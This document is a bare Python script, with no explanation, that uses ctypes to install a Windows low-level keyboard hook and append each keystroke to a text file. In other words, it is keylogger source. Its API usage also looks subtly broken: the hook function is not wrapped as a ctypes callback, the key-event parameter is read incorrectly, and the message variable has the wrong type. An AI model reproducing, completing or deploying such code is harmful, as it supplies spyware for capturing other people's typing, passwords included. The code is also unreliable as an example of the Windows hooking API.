```python
import ctypes
import os

user32 = ctypes.WinDLL('user32', use_last_error=True)

def get_key_name(vk):
    return chr(vk) if 32 <= vk <= 126 else '[' + str(vk) + ']'

def hook_proc(nCode, wParam, lParam):
    if nCode >= 0:
        key = get_key_name(lParam[0])
        with open('randomfile.txt', 'a') as f:
            f.write(key)
    return user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

hook_id = user32.SetWindowsHookExA(13, hook_proc, 0, 0)
if not hook_id:
    raise Exception('Failed to install hook')
msg = ctypes.c_int(0)
while user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != -1:
    pass
```